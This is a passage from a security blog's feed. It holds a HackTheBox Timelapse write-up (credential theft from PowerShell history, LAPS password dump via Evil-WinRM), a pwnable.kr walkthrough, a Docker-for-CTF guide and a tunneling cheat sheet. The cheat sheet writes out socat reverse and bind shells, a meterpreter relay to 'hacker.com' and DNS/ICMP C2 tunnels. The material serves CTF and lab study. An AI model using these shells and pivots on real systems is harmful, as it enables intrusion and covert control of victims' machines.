                                                                                                                                                                                                                                                              Mode                LastWriteTime         Length Name----                -------------         ------ ----d-----       10/23/2021  11:27 AM                Administratord-----       10/25/2021   8:22 AM                legacyyd-r---       10/23/2021  11:27 AM                Publicd-----       10/25/2021  12:23 PM                svc_deployd-----        2/23/2022   5:45 PM                TRX*Evil-WinRM* PS C:\Users&gt; net user svc_deployEnter PEM pass phrase:User name                    svc_deployFull Name                    svc_deployCommentUser&#39;s commentCountry/region code          000 (System Default)Account active               YesAccount expires              NeverPassword last set            10/25/2021 12:12:37 PMPassword expires             NeverPassword changeable          10/26/2021 12:12:37 PMPassword required            YesUser may change password     YesWorkstations allowed         AllLogon scriptUser profileHome directoryLast logon                   10/25/2021 12:25:53 PMLogon hours allowed          AllLocal Group Memberships      *Remote Management UseGlobal Group memberships     *LAPS_Readers         *Domain UsersThe command completed successfully.</code></pre><p>then i looked on the powersell history file. I got the svc_deploy password</p><pre><code>*Evil-WinRM* PS C:\Users&gt; cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txtwhoamiipconfig /allnetstat -ano |select-string LIST$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck$p = ConvertTo-SecureString &#39;REDACTED&#39; -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential (&#39;svc_deploy&#39;, $p)invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock &#123;whoami&#125;get-aduser -filter * -properties *exit</code></pre><p>I login with user svc_deploy</p><pre><code>#evil-winrm -S -u &quot;svc_deploy&quot; -p &#39;REDACTED&#39; -i 10.10.11.152Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionWarning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; </code></pre><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>the document say you can view the local administrator password with this command</p><p>Let import the Powershell Module AdmPwd.PS</p><p>git clone <a href="https://github.com/ztrhgf/LAPS.git" title="https://github.com/ztrhgf/LAPS.git">https://github.com/ztrhgf/LAPS.git</a></p><pre><code>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; upload /root/ctf/htb/timelapse/LAPS/AdmPwd.PS Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run commandInfo: Uploading /root/ctf/htb/timelapse/LAPS/AdmPwd.PS to C:\Users\svc_deploy\Documents\AdmPwd.PS                                                             Data: 53980 bytes of 53980 bytes copiedInfo: Upload successful!*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; Import-module ./AdmPwd.PS</code></pre><p>So refer to the document we need the Computer name to get password</p><blockquote><p>You can also get the password using PowerShell.</p><p>Get-AdmPwdPassword -ComputerName <computername></p></blockquote><pre><code>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; $env:computernameDC01*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; Get-AdmPwdPassword -ComputerName DC01 | Format-table -autosizeComputerName DistinguishedName                                 Password                 ExpirationTimestamp                                                                                      ------------ -----------------                                 --------                 -------------------                                                                                      DC01         CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb REDACTED 4/6/2022 9:46:40 AM                                                                                      </code></pre><p>Login to administrator</p><pre><code>#evil-winrm -S -u &quot;administrator&quot; -p &#39;REDACTED&#39; -i 10.10.11.152                                                                                                                                                                                                                                                                                                      Evil-WinRM shell v3.3                                                                                                                                                                                                                                                                                                                                                                             Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                                                                                                                                                           Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                                                                                                                                                                             Warning: SSL enabled                                                                                                                                                                                                                                                                                                                                                                              Info: Establishing connection to remote endpoint                                                                                                                                                                                                                                                                                                                                            </code></pre><p>finding the root flag</p><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd /users                                                                                                                                      *Evil-WinRM* PS C:\users&gt; tree /f                                                                                                                                                                Folder PATH listing                                                                                                                                                                              Volume serial number is 22CC-AE66 ____TRX    ____3D Objects    ____Contacts    ____Desktop    _       root.txt</code></pre><p>get the root flag</p><pre><code>*Evil-WinRM* PS C:\users&gt; cat TRX/Desktop/root.txt9e605da46bc349*****************</code></pre>]]></content>
    
    
    <summary type="html">Timelapse was an easy box from hackthebox. To solve this machine we need some basic enumuration and basic knowledge about windows.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="htb" scheme="https://mdn1nj4.github.io/tags/htb/"/>
    
    <category term="powershell" scheme="https://mdn1nj4.github.io/tags/powershell/"/>
    
    <category term="smb" scheme="https://mdn1nj4.github.io/tags/smb/"/>
    
    <category term="winrm" scheme="https://mdn1nj4.github.io/tags/winrm/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr - fd Walkthrough</title>
    <link href="https://mdn1nj4.github.io/pwnable.kr/pwnable.kr-fd-walkthrough/"/>
    <id>https://mdn1nj4.github.io/pwnable.kr/pwnable.kr-fd-walkthrough/</id>
    <published>2022-03-29T13:00:00.000Z</published>
    <updated>2025-05-08T07:31:28.286Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span> After you login with creds given for this challenge.<blockquote><p>ssh <a href="mailto:&#x66;&#100;&#64;&#112;&#119;&#110;&#97;&#98;&#108;&#101;&#x2e;&#107;&#x72;">&#x66;&#100;&#64;&#112;&#119;&#110;&#97;&#98;&#108;&#101;&#x2e;&#107;&#x72;</a> -p2222 (pw:guest)</p></blockquote><p>There is some list of files</p><pre><code>fd@pwnable:~$ ls -latotal 40drwxr-x---   5 root   fd   4096 Oct 26  2016 .drwxr-xr-x 116 root   root 4096 Nov 11 14:52 ..d---------   2 root   root 4096 Jun 12  2014 .bash_history-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd-rw-r--r--   1 root   root  418 Jun 11  2014 fd.c-r--r-----   1 fd_pwn root   50 Jun 11  2014 flag-rw-------   1 root   root  128 Oct 26  2016 .gdb_historydr-xr-xr-x   2 root   root 4096 Dec 19  2016 .irssidrwxr-xr-x   2 root   root 4096 Oct 23  2016 .pwntools-cache</code></pre><p>After look at the source code</p><pre><code>    #include &lt;stdio.h&gt;    #include &lt;stdlib.h&gt;    #include &lt;string.h&gt;    char buf[32];    int main(int argc, char* argv[], char* envp[])&#123;        if(argc&lt;2)&#123;            printf(&quot;pass argv[1] a number\n&quot;);            return 0;        &#125;        int fd = atoi( argv[1] ) - 0x1234;        int len = 0;        len = read(fd, buf, 32);        if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;            printf(&quot;good job :)\n&quot;);            system(&quot;/bin/cat flag&quot;);            exit(0);        &#125;        printf(&quot;learn about Linux file IO\n&quot;);        return 0;        &#125;</code></pre><p>i try to enter some random value as a argument for program.</p><pre><code>fd@pwnable:~$ ./fd 1learn about Linux file IO</code></pre><p>lets take a look at the source code again for understand the flow</p><pre><code>    char buf[32];</code></pre><p>allocate the 32 bytes size  for the  buf array</p><p>then jump into the main part of the challenge.</p><pre><code>    int fd = atoi( argv[1] ) - 0x1234;        int len = 0;        len = read(fd, buf, 32);        if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;            printf(&quot;good job :)\n&quot;);            system(&quot;/bin/cat flag&quot;);            exit(0);        &#125;</code></pre><p><strong>atoi</strong> is the funtion used to convert the <strong>string value to integers</strong>.</p><p>value of the <strong>0x1234</strong></p><pre><code>Python 3.8.10 (default, Nov 26 2021, 20:14:08) [GCC 9.3.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; 0x12344660</code></pre><p>so the value of the <strong>0x1234</strong> is <strong>4660</strong></p><p>for our understanding let assume</p><p><strong>fd &#x3D; userinput - 4660</strong></p><p>initiate the len variable with 0  <strong>len &#x3D; 0</strong></p><pre><code>    len = read(fd, buf, 32);</code></pre><p>read() - read from a file descriptor</p><p>fd needs to be 0, 1 or 2</p><p>then we can enter the input for the buf</p><p>it will compare the value with “LETMEWIN” then it will print the flag.</p><pre><code>fd@pwnable:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!fd@pwnable:~$ </code></pre><p>finally we got our flag!</p>]]></content>
    
    
    <summary type="html">Mommy! what is a file descriptor in Linux?</summary>
    
    
    
    <category term="pwnable.kr" scheme="https://mdn1nj4.github.io/categories/pwnable-kr/"/>
    
    
    <category term="reverse" scheme="https://mdn1nj4.github.io/tags/reverse/"/>
    
    <category term="binary" scheme="https://mdn1nj4.github.io/tags/binary/"/>
    
    <category term="pwnable.kr" scheme="https://mdn1nj4.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Setup Docker for CTF</title>
    <link href="https://mdn1nj4.github.io/note/setup-docker-for-ctf/"/>
    <id>https://mdn1nj4.github.io/note/setup-docker-for-ctf/</id>
    <published>2022-02-18T13:00:00.000Z</published>
    <updated>2025-05-08T07:31:28.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Setup-Docker-for-CTF"><a href="#Setup-Docker-for-CTF" class="headerlink" title="Setup Docker for CTF"></a>Setup Docker for CTF</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>I’m using Docker to solve the hackthebox machine. It’s so simple for me to use. Because Ubuntu has been my host machine for several years, and docker supports host networks in linux-based operating systems, but Windows does not. You can also connect the openvpn in docker. If you are using Windows, it will be difficult for you to use because it does not support host networks and you will have some difficulty using the VPN.</p><h2 id="Why-we-need-docker-for-CTF"><a href="#Why-we-need-docker-for-CTF" class="headerlink" title="Why we need docker for CTF"></a>Why we need docker for CTF</h2><p>Docker containers require fewer installations since they share many of their resources with the host system. A container often takes up less space and utilises less RAM and CPU time than a virtual machine. It boot up in a few seconds or less, whereas virtual machines can take several minutes.</p><h2 id="Installing-the-docker-for-Ubuntu"><a href="#Installing-the-docker-for-Ubuntu" class="headerlink" title="Installing the docker for Ubuntu"></a>Installing the docker for Ubuntu</h2><h3 id="Setup-the-repo"><a href="#Setup-the-repo" class="headerlink" title="Setup the repo"></a>Setup the repo</h3><p>Update the <code>apt</code> package index and install packages to allow <code>apt</code> to use a repository over HTTPS:</p><pre><code>sudo apt-get updatesudo apt-get install \    ca-certificates \    curl \    gnupg \    lsb-release</code></pre><p>Add Docker’s official GPG key:</p><pre><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</code></pre><p>Use the following command to set up the <strong>stable</strong> repository.</p><pre><code>echo \  &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \  $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</code></pre><h3 id="Install-Docker-Engine"><a href="#Install-Docker-Engine" class="headerlink" title="Install Docker Engine"></a>Install Docker Engine</h3><p>Update the <code>apt</code> package index, and install the <em>latest version</em> of Docker Engine and containerd, or go to the next step to install a specific version:</p><pre><code>sudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.io</code></pre><h3 id="To-run-Docker-without-root"><a href="#To-run-Docker-without-root" class="headerlink" title="To run Docker without root"></a>To run Docker without root</h3><p>Add your user to the <code>docker</code> group.</p><pre><code>sudo usermod -aG docker $USER</code></pre><p>Log out and log back in so that your group membership is re-evaluated.</p><p>Installation completed now you can run the docker.</p><p>reference: <a href="https://docs.docker.com/engine/install/ubuntu/" title="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p><h2 id="Install-the-parrot-docker-image"><a href="#Install-the-parrot-docker-image" class="headerlink" title="Install the parrot docker image"></a>Install the parrot docker image</h2><pre><code>docker pull parrotsec/security</code></pre><p>now you can run the docker container</p><pre><code>docker run -it --rm -v /etc/hosts:/etc/hosts -w /root/htb --network host -v $(pwd):/root/htb --cap-add=NET_ADMIN --device /dev/net/tun  --name htb parrotsec/security /bin/bash</code></pre>]]></content>
    
    
    <summary type="html">Using Docker to solve CTFs like HackTheBox, Tryhackme, and others...</summary>
    
    
    
    <category term="Tips" scheme="https://mdn1nj4.github.io/categories/Tips/"/>
    
    
    <category term="tips" scheme="https://mdn1nj4.github.io/tags/tips/"/>
    
    <category term="ctf" scheme="https://mdn1nj4.github.io/tags/ctf/"/>
    
    <category term="docker" scheme="https://mdn1nj4.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>Tunneling and Port Forwarding</title>
    <link href="https://mdn1nj4.github.io/note/tunneling-and-port-forwarding/"/>
    <id>https://mdn1nj4.github.io/note/tunneling-and-port-forwarding/</id>
    <published>2021-09-12T13:00:00.000Z</published>
    <updated>2025-05-08T07:31:28.280Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Tunneling-and-Port-Forwarding"><a href="#Tunneling-and-Port-Forwarding" class="headerlink" title="Tunneling and Port Forwarding"></a>Tunneling and Port Forwarding</h1><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h2><p>SSH graphical connection (X)</p><pre><code>ssh -Y -C &lt;user&gt;@&lt;ip&gt; #-Y is less secure but faster than -X</code></pre><h3 id="Local-Port2Port"><a href="#Local-Port2Port" class="headerlink" title="Local Port2Port"></a>Local Port2Port</h3><p>Open new Port in SSH Server –&gt; Other port</p><pre><code>ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywheressh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere</code></pre><h3 id="Port2Port"><a href="#Port2Port" class="headerlink" title="Port2Port"></a>Port2Port</h3><p>Local port –&gt; Compromised host (SSH) –&gt; Third_box:Port</p><pre><code>ssh -i ssh_key &lt;user&gt;@&lt;ip_compromised&gt; -L &lt;attacker_port&gt;:&lt;ip_victim&gt;:&lt;remote_port&gt; [-p &lt;ssh_port&gt;] [-N -f]  #This way the terminal is still in your host #Examplesudo ssh -L 631:&lt;ip_victim&gt;:631 -N -f -l &lt;username&gt; &lt;ip_compromised&gt;</code></pre><h3 id="Port2hostnet-proxychains"><a href="#Port2hostnet-proxychains" class="headerlink" title="Port2hostnet (proxychains)"></a>Port2hostnet (proxychains)</h3><p>Local Port –&gt; Compromised host(SSH) –&gt; Wherever</p><pre><code>ssh -f -N -D &lt;attacker_port&gt; &lt;username&gt;@&lt;ip_compromised&gt; #All sent to local port will exit through the compromised server (use as proxy)</code></pre><h3 id="VPN-Tunnel"><a href="#VPN-Tunnel" class="headerlink" title="VPN-Tunnel"></a>VPN-Tunnel</h3><p>You need <strong>root in both devices</strong> (as you are going to create new interfaces) and the sshd config has to allow root login:<br><code>PermitRootLogin yes</code><br><code>PermitTunnel yes</code></p><pre><code>ssh username@server -w any:any #This wil create Tun interfaces in both devicesip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IPip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP</code></pre><p>Enable forwarding in Server side</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forwardiptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE</code></pre><p>Set new route on client side</p><pre><code>route add -net 10.0.0.0/16 gw 1.1.1.1</code></pre><h2 id="SSHUTTLE"><a href="#SSHUTTLE" class="headerlink" title="SSHUTTLE"></a>SSHUTTLE</h2><p>You can <strong>tunnel</strong> via <strong>ssh</strong> all the <strong>traffic</strong> to a <strong>subnetwork</strong> through a host.<br>Example, forwarding all the traffic going to 10.10.10.0&#x2F;24</p><pre><code>pip install sshuttlesshuttle -r user@host 10.10.10.10/24</code></pre><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><h3 id="Port2Port-1"><a href="#Port2Port-1" class="headerlink" title="Port2Port"></a>Port2Port</h3><p>Local port –&gt; Compromised host (active session) –&gt; Third_box:Port</p><pre><code># Inside a meterpreter sessionportfwd add -l &lt;attacker_port&gt; -p &lt;Remote_port&gt; -r &lt;Remote_host&gt;</code></pre><h3 id="Port2hostnet-proxychains-1"><a href="#Port2hostnet-proxychains-1" class="headerlink" title="Port2hostnet (proxychains)"></a>Port2hostnet (proxychains)</h3><pre><code>background# meterpreter sessionroute add &lt;IP_victim&gt; &lt;Netmask&gt; &lt;Session&gt; # (ex: route add 10.10.10.14 255.255.255.0 8)use auxiliary/server/socks_proxyrun #Proxy port 1080 by defaultecho &quot;socks4 127.0.0.1 1080&quot; &gt; /etc/proxychains.conf #Proxychains</code></pre><p>Another way:</p><pre><code>background #meterpreter sessionuse post/multi/manage/autorouteset SESSION &lt;session_n&gt;set SUBNET &lt;New_net_ip&gt; #Ex: set SUBNET 10.1.13.0set NETMASK &lt;Netmask&gt;runuse auxiliary/server/socks_proxyset VERSION 4arun #Proxy port 1080 by defaultecho &quot;socks4 127.0.0.1 1080&quot; &gt; /etc/proxychains.conf #Proxychains</code></pre><h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p><a href="https://github.com/sensepost/reGeorg" title="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><p>You need to upload a web file tunnel: ashx|aspx|js|jsp|php|php|jsp</p><pre><code>python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp</code></pre><h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><p>You can download it from the releases page of <a href="https://github.com/jpillora/chisel" title="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a><br>You need to use the <strong>same version for client and server</strong></p><h3 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h3><pre><code>./chisel server -p 8080 --reverse #Server./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client#And now you can use proxychains with port 1080 (default)</code></pre><h3 id="Port-forwarding"><a href="#Port-forwarding" class="headerlink" title="Port forwarding"></a>Port forwarding</h3><pre><code>./chisel_1.7.6_linux_amd64 server -p 12312 --reverse./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505</code></pre><h2 id="Rpivot"><a href="#Rpivot" class="headerlink" title="Rpivot"></a>Rpivot</h2><p><a href="https://github.com/klsecservices/rpivot" title="https://github.com/klsecservices/rpivot">https://github.com/klsecservices/rpivot</a></p><p>Reverse tunnel. The tunnel is started from the victim.<br>A socks4 proxy is created on 127.0.0.1:1080</p><pre><code>attacker&gt; python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080victim&gt; python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999</code></pre><p>Pivot through <strong>NTLM proxy</strong></p><pre><code>victim&gt; python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rdvictim&gt; python client.py --server-ip &lt;rpivot_server_ip&gt; --server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45</code></pre><h2 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a><strong>Socat</strong></h2><p><a href="https://github.com/andrew-d/static-binaries" title="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p><h3 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind shell"></a>Bind shell</h3><pre><code>victim&gt; socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,saneattacker&gt; socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337</code></pre><h3 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a>Reverse shell</h3><pre><code>attacker&gt; socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0victim&gt; socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane</code></pre><h3 id="Port2Port-2"><a href="#Port2Port-2" class="headerlink" title="Port2Port"></a>Port2Port</h3><pre><code>socat TCP-LISTEN:&lt;lport&gt;,fork TCP:&lt;redirect_ip&gt;:&lt;rport&gt; &amp;</code></pre><h3 id="Port2Port-through-socks"><a href="#Port2Port-through-socks" class="headerlink" title="Port2Port through socks"></a>Port2Port through socks</h3><pre><code>socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678</code></pre><h3 id="Meterpreter-through-SSL-Socat"><a href="#Meterpreter-through-SSL-Socat" class="headerlink" title="Meterpreter through SSL Socat"></a>Meterpreter through SSL Socat</h3><pre><code>#Create meterpreter backdoor to port 3333 and start msfconsole listener in that portattacker&gt; socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333victim&gt; socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5#Execute the meterpreter</code></pre><p>You can bypass a <strong>non-authenticated proxy</strong> executing this line instead of the last one in the victim’s console:</p><pre><code>OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5</code></pre><p><a href="https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/" title="https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/">https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/</a></p><h3 id="SSL-Socat-Tunnel"><a href="#SSL-Socat-Tunnel" class="headerlink" title="SSL Socat Tunnel"></a>SSL Socat Tunnel</h3><p><strong>&#x2F;bin&#x2F;sh console</strong></p><p>Create certificates in both sides: Client and Server</p><pre><code># Execute this commands in both sidesFILENAME=socatsslopenssl genrsa -out $FILENAME.key 1024openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crtcat $FILENAME.key $FILENAME.crt &gt;$FILENAME.pemchmod 600 $FILENAME.key $FILENAME.pemattacker-listener&gt; socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/shvictim&gt; socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt</code></pre><h3 id="Remote-Port2Port"><a href="#Remote-Port2Port" class="headerlink" title="Remote Port2Port"></a>Remote Port2Port</h3><p>Connect the local SSH port (22) to the 443 port of the attacker host</p><pre><code>attacker&gt; sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost victim&gt; while true; do socat TCP4:&lt;attacker&gt;:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22 attacker&gt; ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim</code></pre><h2 id="Plink-exe"><a href="#Plink-exe" class="headerlink" title="Plink.exe"></a>Plink.exe</h2><p>It’s like a console PuTTY version ( the options are very similar to a ssh client).</p><p>As this binary will be executed in the victim and it is a ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward a only locally accessible port to a port in our machine:</p><pre><code>echo y | plink.exe -l &lt;Our_valid_username&gt; -pw &lt;valid_password&gt; [-p &lt;port&gt;] -R &lt;port_ in_our_host&gt;:&lt;next_ip&gt;:&lt;final_port&gt; &lt;your_ip&gt;echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090</code></pre><h2 id="NTLM-proxy-bypass"><a href="#NTLM-proxy-bypass" class="headerlink" title="NTLM proxy bypass"></a>NTLM proxy bypass</h2><p>The previously mentioned tool: <strong>Rpivot</strong><br><strong>OpenVPN</strong> can also bypass it, setting these options in the configuration file:</p><pre><code>http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm</code></pre><h3 id="Cntlm"><a href="#Cntlm" class="headerlink" title="Cntlm"></a>Cntlm</h3><p><a href="http://cntlm.sourceforge.net/" title="http://cntlm.sourceforge.net/">http://cntlm.sourceforge.net/</a></p><p>It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.<br>Example that forward port 443</p><pre><code>Username Alice Password P@ssw0rd Domain CONTOSO.COM Proxy 10.0.0.10:8080 Tunnel 2222:&lt;attackers_machine&gt;:443</code></pre><p>Now, if you set for example in the victim the <strong>SSH</strong> service to listen in port 443. You can connect to it through the attacker port 2222.<br>You could also use a <strong>meterpreter</strong> that connects to localhost:443 and the attacker is listening in port 2222.</p><h2 id="YARP"><a href="#YARP" class="headerlink" title="YARP"></a>YARP</h2><p>A reverse proxy create by Microsoft. You can find it here: <a href="https://github.com/microsoft/reverse-proxy" title="https://github.com/microsoft/reverse-proxy">https://github.com/microsoft/reverse-proxy</a></p><h2 id="DNS-Tunneling"><a href="#DNS-Tunneling" class="headerlink" title="DNS Tunneling"></a>DNS Tunneling</h2><h3 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h3><p><a href="https://code.kryo.se/iodine/" title="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a></p><p>Root is needed in both systems to create tun adapters and tunnels data between them using DNS queries.</p><pre><code>attacker&gt; iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.comvictim&gt; iodine -f -P P@ssw0rd tunneldomain.com -r#You can see the victim at 1.1.1.2</code></pre><p>The tunnel will be really slow. You can create a compressed SSH connection through this tunnel by using:</p><pre><code>ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080</code></pre><h3 id="DNSCat2"><a href="#DNSCat2" class="headerlink" title="DNSCat2"></a>DNSCat2</h3><p>Establishes a C&amp;C channel through DNS. It doesn’t need root privileges.</p><pre><code>attacker&gt; ruby ./dnscat2.rb tunneldomain.comvictim&gt; ./dnscat2 tunneldomain.com</code></pre><p><strong>Port forwarding with dnscat</strong></p><pre><code>session -i &lt;sessions_id&gt;listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host</code></pre><h4 id="Change-proxychains-DNS"><a href="#Change-proxychains-DNS" class="headerlink" title="Change proxychains DNS"></a>Change proxychains DNS</h4><p>Proxychains intercepts <code>gethostbyname</code> libc call and tunnels tcp DNS request through the socks proxy. By <strong>default</strong> the <strong>DNS</strong> server that proxychains use is <strong>4.2.2.2</strong> (hardcoded). To change it, edit the file: <em>&#x2F;usr&#x2F;lib&#x2F;proxychains3&#x2F;proxyresolv</em> and change the IP. If you are in a <strong>Windows environment</strong> you could set the IP of the <strong>domain controller</strong>.</p><h2 id="Tunnels-in-Go"><a href="#Tunnels-in-Go" class="headerlink" title="Tunnels in Go"></a>Tunnels in Go</h2><p><a href="https://github.com/hotnops/gtunnel" title="https://github.com/hotnops/gtunnel">https://github.com/hotnops/gtunnel</a></p><h2 id="ICMP-Tunneling"><a href="#ICMP-Tunneling" class="headerlink" title="ICMP Tunneling"></a>ICMP Tunneling</h2><h3 id="Hans"><a href="#Hans" class="headerlink" title="Hans"></a>Hans</h3><p><a href="https://github.com/friedrich/hans" title="https://github.com/friedrich/hans">https://github.com/friedrich/hans</a><br><a href="https://github.com/albertzak/hanstunnel" title="https://github.com/albertzak/hanstunnel">https://github.com/albertzak/hanstunnel</a></p><p>Root is needed in both systems to create tun adapters and tunnels data between them using ICMP echo requests.</p><pre><code>./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -vping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100</code></pre><h2 id="Other-tools-to-check"><a href="#Other-tools-to-check" class="headerlink" title="Other tools to check"></a>Other tools to check</h2><ul><li><a href="https://github.com/securesocketfunneling/ssf" title="https://github.com/securesocketfunneling/ssf">https://github.com/securesocketfunneling/ssf</a></li><li><a href="https://github.com/z3APA3A/3proxy" title="https://github.com/z3APA3A/3proxy">https://github.com/z3APA3A/3proxy</a></li><li><a href="https://github.com/jpillora/chisel" title="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></li></ul>]]></content>
    
    
    <summary type="html">Port tunneling or forwarding is a networking technique that allows traffic between local and remote machines. We use port tunneling when we either can’t reach a destination because it is protected behind a firewall or only accessible internally.</summary>
    
    
    
    
    <category term="tunneling" scheme="https://mdn1nj4.github.io/tags/tunneling/"/>
    
    <category term="port forwarding" scheme="https://mdn1nj4.github.io/tags/port-forwarding/"/>
    
    <category term="port tunneling" scheme="https://mdn1nj4.github.io/tags/port-tunneling/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - Lame Writeup</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-lame-writeup/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-lame-writeup/</id>
    <published>2021-09-12T05:39:00.000Z</published>
    <updated>2025-05-08T07:31:28.250Z</updated>
    
